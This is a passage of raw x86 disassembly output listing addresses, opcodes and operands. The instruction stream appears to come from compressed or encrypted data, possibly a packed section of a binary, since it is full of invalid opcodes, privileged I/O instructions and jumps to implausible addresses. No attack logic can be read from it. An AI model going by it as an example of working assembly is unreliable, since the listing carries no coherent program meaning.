  412094:	xor    ch,BYTE PTR [ebx+0xa]
  412097:	jo     0x41203e
  412099:	fcom   QWORD PTR [edi+edi*8]
  41209c:	data16 out 0x84,al
  41209f:	or     eax,0xf55e6e64
  4120a4:	cld    
  4120a5:	es mov dh,0xa1
  4120a8:	popa   
  4120a9:	push   es
  4120aa:	shl    DWORD PTR [eax-0x51],1
  4120ad:	or     dh,BYTE PTR [edi-0x2c]
  4120b0:	pop    ebp
  4120b1:	cli    
  4120b2:	push   edi
  4120b3:	enter  0xbde3,0xc9
  4120b7:	push   eax
  4120b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120b9:	and    dh,bh
  4120bb:	div    ebp
  4120bd:	mov    ecx,0xf96f14ff
  4120c2:	add    bl,BYTE PTR [esi-0x4d]
  4120c5:	mov    bh,0xdb
  4120c7:	mov    edi,0x1b40561a
  4120cc:	dec    esi
  4120cd:	aad    0xb9
  4120cf:	lock mov ch,0x76
  4120d2:	mov    dl,0x66
  4120d4:	adc    al,0x68
  4120d6:	sbb    al,0xc4
  4120d8:	int3   
  4120d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120da:	inc    esp
  4120db:	sub    eax,0x8cd5a25d
  4120e0:	imul   esp,DWORD PTR [ecx],0x728692cb
  4120e6:	jge    0x412088
  4120e8:	jbe    0x412156
  4120ea:	xor    eax,0xb9ad7db9
  4120ef:	push   ebp
  4120f0:	ret    0x1b67
  4120f3:	lods   eax,DWORD PTR ds:[esi]
  4120f4:	lods   al,BYTE PTR ds:[esi]
  4120f5:	sub    ebx,esi
  4120f7:	push   edx
  4120f8:	and    al,0x49
  4120fa:	stos   BYTE PTR es:[edi],al
  4120fb:	adc    BYTE PTR cs:[edx],ah
  4120fe:	jmp    0xc2dc:0xa8cafb8b
  412105:	cli    
  412106:	rcl    DWORD PTR [esi-0x30b80b0e],cl
  41210c:	push   cs
  41210d:	pushf  
  41210e:	xchg   edx,eax
  41210f:	inc    edi
  412110:	sbb    al,0xd9
  412112:	icebp  
  412113:	xchg   esi,eax
  412115:	add    eax,0x9640c42
  41211a:	jp     0x412152
  41211c:	cwde   
  41211d:	lods   al,BYTE PTR ds:[esi]
  41211e:	or     ch,BYTE PTR [esi]
  412120:	push   es
  412121:	mov    bl,0xf5
  412123:	ss imul edx,esp,0x94e6f504
  41212a:	outs   dx,BYTE PTR ds:[esi]
  41212b:	ror    DWORD PTR [ebx],1
  41212d:	sbb    DWORD PTR [ecx+eax*4+0x73],edi
  412131:	arpl   di,di
  412133:	sub    BYTE PTR [ecx+0x9],0xae
  412137:	out    0xc1,eax
  412139:	xchg   ecx,eax
  41213a:	bound  esi,QWORD PTR [ebp-0x17]
  41213d:	push   ds
  41213e:	lea    ebp,[eax-0x6654ffb5]
  412144:	sbb    ebp,DWORD PTR [ebp-0x1b0ebb16]
  41214a:	inc    ecx
  41214b:	fbld   TBYTE PTR [edx-0x5531f07d]
  412151:	nop
  412152:	je     0x412116
  412154:	xchg   DWORD PTR [edx],ebx
  412156:	in     al,0xad
  412158:	pop    ss
  412159:	loope  0x412102
  41215b:	pop    esi
  41215c:	mov    dl,0x2d
  41215e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41215f:	inc    ebp
  412160:	sub    al,ch
  412162:	enter  0xb59b,0x24
  412166:	test   eax,0xbf5546d6
  41216b:	ins    BYTE PTR es:[edi],dx
  41216c:	faddp  st(0),st
  41216e:	push   ecx
  41216f:	push   es
  412170:	add    bl,0x28
  412173:	fs ds fxch st(6)
  412177:	jmp    0x1c091aa4
  41217c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41217d:	retf   0x4174
  412180:	aaa    
  412181:	adc    eax,0xd9cb3e17
  412186:	jg     0x412189
  412188:	and    bl,dh
  41218a:	pop    edx
  41218b:	div    BYTE PTR [ebx]
  41218d:	fbld   TBYTE PTR [ebx*2-0x6430c685]
  412194:	lea    esi,[eax+0x242e4eb6]
  41219a:	das    
  41219b:	in     eax,0xa1
  41219d:	sbb    DWORD PTR [ebp-0x78],ebp
  4121a0:	bound  edi,QWORD PTR [ecx]
  4121a2:	pushf  
  4121a3:	mov    dl,0x8a
  4121a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121a7:	jg     0x4121f9
  4121a9:	es jnp 0x412219
  4121ac:	and    al,0x37
  4121ae:	or     edx,edi
  4121b0:	in     eax,0xbe
  4121b2:	pop    esp
  4121b3:	inc    ebp
  4121b4:	or     al,0xe1
  4121b6:	test   DWORD PTR [ecx],eax
  4121b8:	stos   BYTE PTR es:[edi],al
  4121b9:	mov    esi,0x9119954e
  4121be:	cdq    
  4121bf:	mov    ds:0x3b2ae00e,eax
  4121c4:	mov    edi,0xe9f86599
  4121c9:	aam    0x7b
  4121cb:	loop   0x412249
  4121cd:	mov    cl,0x8b
  4121cf:	pop    ss
  4121d0:	push   esp
  4121d1:	xchg   ecx,eax
  4121d2:	xchg   ebp,eax
  4121d3:	pusha  
  4121d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121d5:	cdq    
  4121d6:	dec    ebp
  4121d7:	sbb    eax,0x2d3b0f8c
  4121dc:	add    al,0x4a
  4121de:	mov    ch,0x37
  4121e0:	xchg   ecx,eax
  4121e1:	xchg   dh,bh
  4121e3:	iret   
  4121e4:	iret   
  4121e5:	push   eax
  4121e6:	jmp    0x9b80d7a9
  4121eb:	test   BYTE PTR [ecx-0x38156421],al
  4121f1:	or     al,0xde
  4121f3:	push   cs
  4121f4:	mov    DWORD PTR [esi+0xc],ecx
  4121f7:	push   0xffffff92
  4121f9:	mov    dh,0xe7
  4121fb:	inc    ebp
  4121fc:	mov    edx,0xf996b205
  412201:	(bad)  
  412202:	shl    DWORD PTR [edx-0x687efdd1],1
  412208:	pushf  
  412209:	hlt    
  41220a:	push   ss
  41220b:	ret    0xb1bb
  41220e:	scas   al,BYTE PTR es:[edi]
  41220f:	(bad)  [esi+0x3a]
  412212:	std    
  412213:	dec    edi
  412214:	dec    edx
  412215:	clc    
  412216:	or     ax,di
  412219:	sbb    eax,0xa0e27aee
  41221e:	mov    ss,WORD PTR [esp+edx*1-0x7a494b3e]
  412225:	das    
  412226:	mov    bl,0xad
  412228:	jle    0x412296
  41222a:	(bad)  
  41222b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41222c:	xchg   esp,eax
  41222d:	adc    eax,0x50ae86de
  412232:	jp     0x41226d
  412234:	test   al,0x1e
  412236:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412238:	fld    TBYTE PTR [edi-0xd47a6c9]
  41223e:	retf   
  41223f:	repz fstp TBYTE PTR [ecx+eiz*2]
  412243:	das    
  412244:	loope  0x412261
  412246:	lods   al,BYTE PTR ds:[esi]
  412247:	jmp    0x3fe9b698
  41224c:	out    dx,eax
  41224d:	pushf  
  41224e:	or     edx,DWORD PTR [ebx]
  412250:	sub    BYTE PTR ds:[ebp-0x63d3e188],ah
  412257:	in     eax,0xd5
  412259:	shr    DWORD PTR [edx-0x56],0x2
  41225d:	ret    
  41225e:	out    0xb,eax
  412260:	xchg   edi,eax
  412261:	test   DWORD PTR [esi],esp
  412263:	(bad)  
  412265:	add    BYTE PTR [ecx+0x4eb5751],al
  41226b:	test   al,0x5e
  41226d:	std    
  41226e:	stos   DWORD PTR es:[edi],eax
  41226f:	aas    
  412270:	pop    ds
  412271:	mov    bl,0x97
  412273:	lods   al,BYTE PTR ds:[esi]
  412274:	jno    0x412258
  412276:	mov    dh,0x9c
  412278:	and    eax,0x421aa600
  41227d:	jnp    0x4122b5
  41227f:	enter  0x80dc,0x78
  412283:	xor    bl,BYTE PTR [ecx+0x53]
  412286:	jo     0x4122f9
  412288:	add    ah,BYTE PTR [ebx-0x63]
  41228b:	imul   eax,DWORD PTR [eax+eiz*2+0x53b41192],0x652d74cc
  412296:	inc    edi
  412297:	jl     0x412263
  412299:	in     eax,0xee
  41229b:	and    bl,BYTE PTR [eax-0xd0e08eb]
  4122a1:	push   eax
  4122a2:	retf   
  4122a3:	cs sbb ebx,eax
  4122a6:	mov    al,ds:0xecb25709
  4122ab:	mov    esi,DWORD PTR [ecx+eax*1]
  4122ae:	jmp    0xfee5089b
  4122b3:	mov    esi,?
  4122b5:	cwde   
  4122b6:	mov    ebx,ds
  4122b8:	mov    al,ds:0x379ae757
  4122bd:	inc    ebx
  4122be:	inc    ebx
  4122bf:	scas   eax,DWORD PTR es:[edi]
  4122c0:	pop    ds
  4122c1:	mov    esi,0xa9f767dc
  4122c6:	ss pop edi
  4122c8:	sbb    DWORD PTR [ebx-0x52],ecx
  4122cb:	pop    ds
  4122cc:	add    DWORD PTR [edi+0x20],edx
  4122cf:	sbb    DWORD PTR [ebp+0x7d],0xd4a2d405
  4122d6:	mov    ah,0xf7
  4122d8:	and    BYTE PTR [ebx-0x63],0x81
  4122dc:	arpl   dx,di
  4122de:	mov    eax,ds:0xe91f63b2
  4122e3:	retf   
  4122e4:	arpl   bp,bp
  4122e6:	inc    esp
  4122e7:	mov    edi,0x4939c985
  4122ec:	mov    edx,0xb59fbb96
  4122f1:	xchg   ebp,eax
  4122f2:	out    dx,al
  4122f3:	pcmpeqd mm5,QWORD PTR [ebp-0x3c395fcd]
  4122fa:	pop    esi
  4122fb:	or     al,0x69
  4122fd:	adc    eax,0x290830bf
  412302:	cmp    DWORD PTR [eax+edx*2-0x67],ebx
  412306:	icebp  
  412307:	or     ah,BYTE PTR [eax+0x70]
  41230a:	add    al,0x24
  41230c:	jb     0x412316
  41230e:	pop    esi
  41230f:	loopne 0x4122be
  412311:	data16 adc al,0xa3
  412314:	test   eax,0x92d86d4b
  412319:	in     al,dx
  41231a:	movlhps xmm0,xmm7
  41231d:	pusha  
  41231e:	ins    DWORD PTR es:[edi],dx
  41231f:	rol    BYTE PTR [eax],1
  412321:	adc    edi,edi
  412323:	cdq    
  412324:	mov    dl,0xc
  412326:	hlt    
  412327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412328:	mov    dl,0xbf
  41232a:	retf   
  41232b:	jnp    0x4122d2
  41232d:	in     eax,dx
  41232e:	push   cs
  41232f:	test   eax,0xe8c12345
  412334:	add    al,0x6d
  412336:	repz adc al,0xdb
  412339:	sahf   
  41233a:	push   eax
  41233b:	(bad)  
  41233c:	leave  
  41233d:	add    edi,DWORD PTR [edx-0x34]
  412340:	cld    
  412341:	sub    cl,0xd1
  412344:	cmp    dh,BYTE PTR [edi+0x42]
  412347:	mov    edx,0xaf96ca85
  41234c:	dec    edi
  41234d:	in     eax,dx
  41234e:	dec    edx
  41234f:	fs in  eax,dx
  412351:	cs xchg esi,eax
  412353:	arpl   sp,di
  412355:	inc    ecx
  412356:	ds out dx,al
  412358:	fnstcw WORD PTR [eax+0xc7d5a37]
  41235e:	sub    eax,0x44703295
  412363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412364:	(bad)  
  412365:	stos   DWORD PTR es:[edi],eax
  412366:	mov    dl,0xbe
  412368:	pusha  
  412369:	or     eax,0x97f8dc0f
  41236e:	dec    esp
  41236f:	jae    0x41233c
  412371:	xchg   DWORD PTR [ecx+0x63],eax
  412374:	out    0x46,eax
  412376:	nop
  412377:	adc    edi,DWORD PTR [edi]
  412379:	retf   0xf28e
  41237c:	call   0xf61f2e53
  412381:	push   ebp
  412382:	xor    al,0xd3
  412384:	jecxz  0x41234f
  412386:	shr    al,1
  412388:	or     ebp,edx
  41238a:	dec    ebp
  41238b:	test   eax,0x94960bc2
  412390:	jns    0x41238e
  412392:	enter  0xa92e,0x37
  412396:	fadd   DWORD PTR [edx]
  412398:	sub    ch,BYTE PTR [ebx-0x3de5bce5]
  41239e:	jne    0x4123dd
  4123a0:	dec    esi
  4123a1:	sub    DWORD PTR [eax+0x791e5306],edx
  4123a7:	into   
  4123a8:	scas   al,BYTE PTR es:[edi]
  4123a9:	loope  0x412333
  4123ab:	sub    edi,DWORD PTR [ecx+eax*4]
  4123ae:	loope  0x41233c
  4123b0:	in     eax,0x76
  4123b2:	inc    ebx
  4123b3:	jo     0x4123bb
  4123b5:	xor    al,0x95
  4123b7:	mov    ebp,0x78e2df2c
  4123bc:	popa   
  4123bd:	mov    ebx,DWORD PTR [eax+0x764809]
  4123c3:	sub    BYTE PTR ds:0xe18bb255,dl
  4123c9:	jnp    0x412409
  4123cb:	in     eax,0xa
  4123cd:	inc    edi
  4123ce:	cmc    
  4123cf:	call   0x4522:0xf07cce12
  4123d6:	outs   dx,BYTE PTR ds:[esi]
  4123d7:	imul   esi,DWORD PTR [esp+edi*4-0x28],0xfffffff8
  4123dc:	call   0x14047f8b
  4123e1:	loopne 0x412426
  4123e3:	dec    ebp
  4123e4:	pop    edi
  4123e5:	mov    ds:0xf20c289b,al
  4123ea:	dec    eax
  4123eb:	xchg   ebp,eax
  4123ec:	(bad)
  4123ef:	bound  esi,QWORD PTR [ebx+0x7682659e]
  4123f5:	or     al,0x74
  4123f7:	xchg   DWORD PTR [ebx+0x2d],esp
  4123fa:	in     al,dx
  4123fb:	mov    esi,0x6f05d503
  412400:	lock fsubr QWORD PTR [ebx]
  412403:	push   0x18
  412405:	jl     0x41239a
  412407:	scas   eax,DWORD PTR es:[edi]
  412408:	imul   DWORD PTR [ebp-0x3a]
  41240b:	into   
  41240c:	addr16 daa 
  41240e:	adc    ebx,DWORD PTR fs:[ebp+0x46]
  412412:	mov    bh,0x57
  412414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412415:	mov    ah,0x45
  412417:	jne    0x412459
  412419:	das    
  41241a:	scas   eax,DWORD PTR es:[edi]
  41241b:	push   0x6f
  41241d:	ss push 0xffffffad
  412420:	jge    0x4123f2
  412422:	mov    edx,0x7de8b55
  412427:	test   eax,0x51dbb645
  41242c:	ret    
  41242d:	call   0x4fb:0x97130049
  412434:	push   DWORD PTR [ebx]
  412436:	inc    ebp
  412437:	xlat   BYTE PTR ds:[ebx]
  412438:	ds jle 0x4123f4
  41243b:	ja     0x4123ca
  41243d:	mov    eax,ds:0xb9069ac8
  412442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412443:	mov    bh,0x28
  412445:	sub    eax,0x11ecb0c4
  41244a:	cdq    
  41244b:	loope  0x41246c
  41244d:	ja     0x41243b
  41244f:	lods   al,BYTE PTR ds:[esi]
  412450:	cdq    
  412451:	mov    ebx,0xdeed81e3
  412456:	je     0x4123df
  412458:	mov    fs,WORD PTR [ebp+0x48]
  41245b:	mov    eax,ds:0x76c48c1d
  412460:	jo     0x412452
  412462:	sub    bl,bh
  412464:	aad    0x24
  412466:	add    bl,BYTE PTR [esi+0x1417a71]
  41246c:	jmp    0x4124cd
  41246e:	sbb    al,0x73
  412470:	(bad)  
  412471:	xchg   edx,eax
  412472:	ins    DWORD PTR es:[edi],dx
  412473:	clc    
  412474:	cwde   
  412475:	inc    edi
  412476:	mov    al,0x46
  412478:	adc    DWORD PTR [ebp-0x59],ecx
  41247b:	push   eax
  41247c:	fldenv [edi]
  41247e:	ret    0x62e2
  412481:	and    ch,0x5
  412484:	and    eax,0x54e7abb0
  412489:	jg     0x4124c0
  41248b:	test   al,0x99
  41248d:	pop    ebx
  41248e:	push   esi
  41248f:	popa   
  412490:	pop    edx
  412491:	(bad)  
  412492:	in     eax,0x19
  412494:	push   ds
  412495:	cmp    al,0xa2
  412497:	pop    es
  412498:	jb     0x4124f8
  41249a:	sub    DWORD PTR [esi-0x95a44ef],esp
  4124a0:	hlt    
  4124a1:	out    0x59,al
  4124a3:	sbb    al,0xb0
  4124a5:	in     al,0x6
  4124a7:	sub    bl,BYTE PTR [edi-0x55]
  4124aa:	pop    ebp
  4124ab:	or     BYTE PTR [eax-0x40f011ef],bl
  4124b1:	loopne 0x412465
  4124b3:	and    edi,DWORD PTR [ecx]
  4124b5:	xchg   ecx,eax
  4124b6:	cmp    bl,bh
  4124b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124b9:	push   eax
  4124ba:	out    0xa1,al
  4124bc:	std    
  4124bd:	xor    ch,BYTE PTR [edx]
  4124bf:	cmp    al,0x43
  4124c1:	lock mov dh,0xf7
  4124c4:	mov    ch,0x94
  4124c6:	mov    esp,ebx
  4124c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124c9:	fldcw  WORD PTR [ecx+0x77]
  4124cc:	mov    eax,0xf36dfe4e
  4124d1:	cdq    
  4124d2:	jmp    0x4124ef
  4124d4:	ret    
  4124d5:	jle    0x4124ae
  4124d7:	mov    esp,0x398e4ce
  4124dc:	rcl    DWORD PTR ds:0xaef3e3fb,cl
  4124e2:	arpl   WORD PTR [ebp-0x69],sp
  4124e5:	jg     0x412512
  4124e7:	in     al,dx
  4124e8:	jbe    0x41248f
  4124ea:	mov    ebx,0x78b17484
  4124ef:	repnz pop esi
  4124f1:	push   ds
  4124f2:	cmp    al,0x68
  4124f4:	xchg   ecx,eax
  4124f5:	fnstcw WORD PTR [edx-0x3e]
  4124f8:	outs   dx,DWORD PTR ds:[esi]
  4124f9:	xchg   ebx,eax
  4124fa:	or     al,0x61
  4124fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124fd:	add    eax,0xd27fa74d
  412502:	aad    0xb4
  412504:	retf   
  412505:	pop    ds
  412506:	mov    ecx,0xacd8b74
  41250b:	mov    esi,0x30bce13f
  412510:	int3   
  412511:	cmp    al,0xf6
  412513:	cmp    al,0x3f
  412515:	cmp    eax,0xc62bb0b6
  41251a:	sub    eax,0x79196f8e
  41251f:	and    BYTE PTR [ebp-0x3d902dbd],dh
  412525:	rcr    DWORD PTR [ecx],1
  412527:	inc    eax
  412528:	mov    cl,BYTE PTR [esp+edx*4+0x4b]
  41252c:	dec    edi
  41252d:	sbb    al,0x7a
  41252f:	test   eax,0x4345f616
  412534:	mov    WORD PTR [eax-0x35],gs
  412537:	jno    0x41251a
  412539:	mov    ch,BYTE PTR [edx-0x1f]
  41253c:	loopne 0x4124d3
  41253e:	ds sub eax,0xa367a9f
  412544:	rcl    BYTE PTR [edi],0x9
  412547:	dec    edi
  412548:	cmp    BYTE PTR [esi+0x3bd835f7],cl
  41254e:	mov    fs,WORD PTR [edx-0x58257b41]
  412554:	sbb    dh,dh
  412556:	lods   eax,DWORD PTR ds:[esi]
  412557:	dec    ecx
  412558:	add    DWORD PTR [edx],esi
  41255a:	sub    BYTE PTR [edx+ecx*2+0x705618ca],ch
  412561:	cmp    ch,ah
  412563:	scas   al,BYTE PTR es:[edi]
  412564:	adc    eax,0xd412ef7a
  412569:	mul    DWORD PTR [edi+0x5cb9fffc]
  41256f:	sti    
  412570:	mov    cl,dl
  412572:	pushf  
  412573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412574:	stos   BYTE PTR es:[edi],al
  412575:	(bad)
  412578:	mov    es,WORD PTR [ebx-0x33974c99]
  41257e:	pop    DWORD PTR [ecx+0x56]
  412581:	sub    ch,dl
  412583:	push   0xee9080fc
  412588:	ins    BYTE PTR es:[edi],dx
  412589:	mov    ecx,0x6b9edb7c
  41258e:	(bad)  
  41258f:	jmp    DWORD PTR [ebp+0x6c]
  412592:	arpl   WORD PTR [ebx-0xd2593db],dx
  412598:	ds leave 
  41259a:	clc    
  41259b:	loop   0x4125bd
  41259d:	cmp    DWORD PTR [ecx-0x64],esp
  4125a0:	in     eax,dx
  4125a1:	push   edx
  4125a2:	adc    bl,ah
  4125a4:	push   ecx
  4125a5:	sbb    BYTE PTR [ecx],dl
  4125a7:	test   BYTE PTR [ecx],dh
  4125a9:	xor    bl,bh
  4125ab:	dec    eax
  4125ac:	jmp    0x9501fd30
  4125b1:	mov    ds:0x5f2004bc,eax
  4125b6:	mov    cl,0xda
  4125b8:	and    eax,0x73c66a3b
  4125bd:	xchg   BYTE PTR [ebx+0x3d],cl
  4125c0:	xchg   ebp,eax
  4125c1:	push   ecx
  4125c2:	mov    ecx,DWORD PTR [eax-0x6f]
  4125c5:	sbb    eax,0x8564fa96
  4125ca:	je     0x41258c
  4125cc:	addr16 cmp eax,0x5b61a318
  4125d2:	dec    eax
  4125d3:	pop    esp
  4125d4:	inc    BYTE PTR ds:0xcf0614f9
  4125da:	mov    ecx,0xc92bd739
  4125df:	popa   
  4125e0:	sbb    bh,BYTE PTR [ebx+0x1e]
  4125e3:	jb     0x4125ac
  4125e5:	add    eax,0x8ad07c06
  4125ea:	add    al,0xff
  4125ec:	scas   eax,DWORD PTR es:[edi]
  4125ed:	les    esi,FWORD PTR [esi]
  4125ef:	mov    DWORD PTR [eax],ecx
  4125f1:	std    
  4125f2:	int3   
  4125f3:	popa   
  4125f4:	aam    0xe0
  4125f6:	inc    ebx
  4125f7:	test   al,0xa3
  4125f9:	and    al,0x32
  4125fb:	rcr    ecx,1
  4125fd:	adc    dh,BYTE PTR [ebx-0x15ae65f5]
  412603:	dec    eax
  412604:	ja     0x412599
  412606:	mov    esp,0x7e3b369b
  41260b:	xchg   esi,eax
  41260c:	dec    eax
  41260d:	cmp    eax,0xf0fb9641
  412612:	pop    es
  412613:	test   DWORD PTR [ecx+0x3b],ebp
  412616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412617:	pushf  
  412618:	mov    edx,0x15506f97
  41261e:	sbb    al,0xe0
  412620:	jbe    0x412698
  412622:	sbb    DWORD PTR [edi],edx
  412624:	push   ss
  412625:	xchg   esi,eax
  412626:	pop    edi
  412627:	push   es
  412628:	dec    eax
  412629:	aad    0x3b
  41262b:	xchg   esp,eax
  41262c:	push   esi
  41262d:	aam    0xe0
  41262f:	cmp    bl,al
  412631:	xor    ah,dh
  412633:	mov    ah,0xad
  412635:	enter  0xc8d0,0xc1
  412639:	xchg   edi,eax
  41263a:	icebp  
  41263b:	(bad)  
  41263c:	jmp    0x1586:0xaa62162f
  412643:	sub    eax,0xe031b085
  412648:	pop    edi
  412649:	sbb    al,0xe9
  41264b:	or     BYTE PTR [ebx+ecx*2+0x1a4597ef],0xc7
  412653:	adc    al,al
  412655:	adc    DWORD PTR [edx+eiz*8+0x328d254d],edx
  41265c:	mov    dh,0xf1
  41265e:	ins    BYTE PTR es:[edi],dx
  41265f:	arpl   WORD PTR [ecx-0x47],si
  412662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412663:	sbb    DWORD PTR [ebx-0x2e],edi
  412666:	stos   DWORD PTR es:[edi],eax
  412667:	mov    ds:0xf15f0a7b,al
  41266c:	sbb    al,0x7d
  41266e:	leave  
  41266f:	aad    0x63
  412671:	jg     0x412681
  412673:	cld    
  412674:	inc    eax
  412675:	xor    BYTE PTR [ecx+edi*4-0x27],dl
  412679:	mov    eax,ds:0x198438e0
  41267e:	rcr    DWORD PTR [ebp*2+0x5c835bf2],1
  412685:	mov    gs,eax
  412687:	out    dx,al
  412688:	push   edi
  412689:	mov    ch,0xaf
  41268b:	verw   WORD PTR [ebx]
  41268e:	aam    0xef
  412690:	outs   dx,BYTE PTR ds:[esi]
  412691:	pop    edx
  412692:	ss pushf 
  412694:	xchg   ebp,eax
  412695:	mov    ds:0x8907c4e9,eax
  41269a:	xor    ebx,DWORD PTR [esi-0x18a83f99]
  4126a0:	pop    edx
  4126a1:	or     eax,0x664ad1fc
  4126a6:	xchg   DWORD PTR [eax],ebp
  4126a8:	and    DWORD PTR [ecx-0x280f8839],0x42303729
  4126b2:	js     0x4126c2
  4126b4:	mov    esi,0xaac1305e
  4126b9:	cwde   
  4126ba:	xchg   ebp,eax
  4126bb:	loopne 0x41270e
  4126bd:	jg     0x41273e
  4126bf:	retf   
  4126c0:	das    
  4126c1:	pushf  
  4126c2:	push   es
  4126c3:	push   es
  4126c4:	pushf  
  4126c5:	cmp    eax,DWORD PTR [edi]
  4126c7:	jno    0x412720
  4126c9:	mov    ds:0x472d73af,al
  4126ce:	mov    ch,0xdf
  4126d0:	ret    
  4126d1:	and    al,0xfd
  4126d3:	mov    edx,0x7281b307
  4126d8:	test   ebp,0x4f5a7e9c
  4126de:	arpl   di,si
  4126e0:	push   0x7e58fc98
  4126e5:	pushf  
  4126e6:	cmp    DWORD PTR [ecx+0x7a],ebx
  4126e9:	hlt    
  4126ea:	stos   DWORD PTR es:[edi],eax
  4126eb:	pushf  
  4126ec:	and    ecx,eax
  4126ee:	inc    ebp
  4126ef:	or     al,0xe0
  4126f1:	jmp    0xf2f69dc4
  4126f6:	fmul   st,st(0)
  4126f8:	inc    eax
  4126f9:	popf   
  4126fa:	xchg   esi,eax
  4126fb:	or     BYTE PTR [edi],dl
  4126fd:	stos   BYTE PTR es:[edi],al
  4126fe:	dec    ecx
  4126ff:	cmp    ah,BYTE PTR [ebx]
  412701:	push   0xffffffbc
  412703:	xor    BYTE PTR [ebp-0x7],ah
  412706:	adc    ebp,DWORD PTR [esi+0x42]
  412709:	dec    edx
  41270a:	mov    edx,0xd5b60db5
  41270f:	test   BYTE PTR [di-0x1933],cl
  412714:	(bad)  
  412715:	cld    
  412716:	or     bl,BYTE PTR [edi+0x1c]
  412719:	fmul   st,st(3)
  41271b:	pop    ss
  41271c:	push   es
  41271d:	inc    esp
  41271e:	cli    
  41271f:	aas    
  412720:	xor    dh,BYTE PTR [edi-0x71]
  412723:	pop    eax
  412724:	sbb    al,0xad
  412726:	in     al,0x6f
  412728:	adc    BYTE PTR [ebp+0x46e68d0a],dh
  41272e:	add    ebx,DWORD PTR [eax+0x280a66c9]
  412734:	mov    edx,ecx
  412736:	or     al,0x7d
  412738:	fcom   st(4)
  41273a:	push   esi
  41273b:	jmp    0xb518:0x21369580
  412742:	sahf   
  412743:	and    al,0xd7
  412745:	adc    bh,cl
  412747:	xor    al,0xa2
  412749:	stos   DWORD PTR es:[edi],eax
  41274a:	clc    
  41274b:	fwait
  41274c:	xchg   DWORD PTR [eax],esp
  41274e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41274f:	bnd jae 0x412731
  412752:	add    ebp,DWORD PTR [ecx-0x760841f1]
  412758:	ficom  WORD PTR [esi+0x20]
  41275b:	or     al,0x5e
  41275d:	ins    DWORD PTR es:[edi],dx
  41275e:	jno    0x4126e1
  412760:	jbe    0x41271b
  412762:	sbb    esi,DWORD PTR [edi]
  412764:	mov    edx,0x6190a70a
  412769:	xchg   ebx,eax
  41276a:	xor    ecx,DWORD PTR [edi-0x127d72ba]
  412770:	jns    0x412792
  412772:	cmp    DWORD PTR [ebx+ecx*1+0x35e356c6],esi
  412779:	jecxz  0x41276d
  41277b:	iret   
  41277c:	sub    bh,BYTE PTR [eax-0x1c87c50e]
  412782:	fs (bad) 
  412784:	setno  BYTE PTR [ecx+0x6daf0236]
  41278b:	popf   
  41278c:	addr16 xchg edx,eax
  41278e:	fld    TBYTE PTR [eax+0x28f5f292]
  412794:	xchg   DWORD PTR [esi-0x2ec7b563],esp
  41279a:	mov    ds:0xfb0af89a,eax
  41279f:	and    BYTE PTR [edi-0x3a],cl
  4127a2:	shr    DWORD PTR [edx],cl
  4127a4:	(bad)  
  4127a6:	xor    dh,0x8b
  4127a9:	sbb    DWORD PTR [ebp+0x6f17516a],0xa302e6d2
  4127b3:	cdq    
  4127b4:	lds    ecx,FWORD PTR [esi-0x37]
  4127b7:	xchg   ecx,eax
  4127b8:	or     BYTE PTR ds:0xf0524532,0x19
  4127bf:	jbe    0x41278f
  4127c1:	nop    DWORD PTR [edi]
  4127c4:	dec    ebx
  4127c5:	sub    al,0xff
  4127c7:	adc    BYTE PTR [esp+eiz*4+0xf],ch
  4127cb:	sub    eax,0x84c34256
  4127d0:	cs mov gs,esp
  4127d3:	or     BYTE PTR [ebp+0x13],dl
  4127d6:	(bad)  
  4127d7:	(bad)  [edi]
  4127d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127da:	sub    ebx,DWORD PTR [ebp+0x50]
  4127dd:	test   al,0xee
  4127df:	test   DWORD PTR [edx+0x2a],eax
  4127e2:	retf   
  4127e3:	in     eax,0x6
  4127e5:	mul    DWORD PTR [esi+0x24bf9e43]
  4127eb:	cmp    ebx,ecx
  4127ed:	adc    BYTE PTR [edx+edx*8+0x2d],ah
  4127f1:	cmc    
  4127f2:	je     0x412798
  4127f4:	push   ss
  4127f5:	shl    DWORD PTR [edi+0x18],1
  4127f8:	cmc    
  4127f9:	adc    ch,dl
  4127fb:	inc    ebx
  4127fc:	sar    DWORD PTR [edx+0x1b],cl
  4127ff:	mov    edx,0xf6471aaa
  412804:	arpl   WORD PTR [edx+0x3fec746b],di
  41280a:	enter  0x3d64,0x80
  41280e:	(bad)  
  41280f:	aam    0x91
  412811:	jae    0x412887
  412813:	and    bl,BYTE PTR [edi-0x6a5501cb]
  412819:	sub    dh,BYTE PTR [esi]
  41281b:	sbb    eax,0xa4c83273
  412820:	cld    
  412821:	lock sbb BYTE PTR [ebp+0x42f563a9],0x5a
  412829:	scas   eax,DWORD PTR es:[edi]
  41282a:	mov    esi,0x75ebd78d
  41282f:	sbb    ah,0x42
  412832:	es fucomp st(2)
  412835:	fwait
  412836:	es ja  0x412866
  412839:	pop    eax
  41283a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41283b:	push   0xffffffbb
  41283d:	push   edi
  41283e:	xchg   edx,eax
  41283f:	add    eax,0xddf27bc6
  412844:	or     eax,0xa1e1081c
  412849:	std    
  41284a:	add    eax,DWORD PTR [ebx-0x9]
  41284d:	add    eax,0xd27e2cd0
  412852:	cmp    DWORD PTR [ecx],ebp
  412854:	mov    bl,0x2d
  412856:	inc    ebx
